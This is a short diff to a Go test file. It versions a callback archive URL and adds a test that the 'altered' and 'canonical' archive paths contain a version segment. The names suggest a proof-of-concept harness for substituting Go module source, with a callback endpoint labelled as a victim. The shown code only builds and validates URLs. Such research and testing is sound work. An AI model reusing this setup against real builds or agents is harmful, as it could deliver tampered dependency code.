@@ -23,7 +23,7 @@ func installTestConfiguration(t *testing.T) {
 	callbackSessionNonce = strings.Repeat("a", 64)
 	callbackOrigin := "https://us-central1-s0victim-44547.cloudfunctions.net/go-cgo-v131-source-substitution-codex"
 	callbackBaseURL = callbackOrigin + "/v1/session/" + callbackSessionNonce
-	alteredReadbackURL = callbackOrigin + "/v1/archive/" + callbackSessionNonce + "/altered/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/v0.0.10.zip"
+	alteredReadbackURL = callbackOrigin + "/v1/archive/" + callbackSessionNonce + "/v139/altered/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/v0.0.10.zip"
 	digest := sha256.Sum256([]byte(alteredReadbackURL))
 	alteredReadbackURLSHA256 = hex.EncodeToString(digest[:])
 	alteredRequestPayloadSHA256, alteredRequestFrameSHA256 = strings.Repeat("0", 64), strings.Repeat("0", 64)
@@ -59,6 +59,23 @@ func TestRuntimeConfigurationPinsProductionURLDigest(t *testing.T) {
 	pinnedReadbackURLSHA256 = strings.Repeat("0", 64)
 	if err := validateRuntimeConfiguration(); err == nil {
 		t.Fatal("digest claim inconsistent with URL bytes was accepted")
+	}
+}
+
+func TestLinkedProductionConfigurationUsesVersionedArchivePath(t *testing.T) {
+	if callbackBaseURL == "" {
+		t.Skip("production link variables are not set")
+	}
+	for _, mode := range []string{"altered", "canonical"} {
+		if err := configureMode(mode); err != nil {
+			t.Fatal(err)
+		}
+		if err := validateRuntimeConfiguration(); err != nil {
+			t.Fatalf("%s linked configuration rejected: %v", mode, err)
+		}
+		if !strings.Contains(pinnedReadbackURL, "/v139/"+mode+"/") {
+			t.Fatalf("%s archive path was not version-specific", mode)
+		}
 	}
 }
 
